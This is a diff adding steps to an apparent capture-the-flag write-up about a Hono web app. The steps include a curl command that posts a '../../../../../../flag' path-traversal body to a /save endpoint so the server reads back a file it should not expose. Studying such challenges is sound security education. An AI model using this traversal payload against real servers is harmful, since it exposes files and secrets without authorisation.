@@ -434,3 +434,31 @@ app.post('/save', async c => {
   const content = await getResultContent(type)
   const filename = randomString()
 ```
+
+- The comments of [request](https://github.com/honojs/hono/blob/main/src/request.ts) reveals that `.text()` returns the body's value of  Content-Type `text/plain` and return it as the value.
+
+```typescript
+ /**
+   * `.text()` can parse Request body of type `text/plain`
+   *
+   * @see {@link https://hono.dev/docs/api/request#text}
+   *
+   * @example
+   * ```ts
+   * app.post('/entry', async (c) => {
+   *   const body = await c.req.text()
+   * })
+   * ```
+```
+
+- The body will be like `-d "../../../../../../flag"` to read the flag.
+
+```bash
+ curl http://34.170.146.252:40060/save -d "../../../../../../flag"
+```
+
+<img width="983" height="435" alt="image" src="https://github.com/user-attachments/assets/487ce8c3-330f-487a-b42b-54595e4ab8eb" />
+
+
+-------------
+
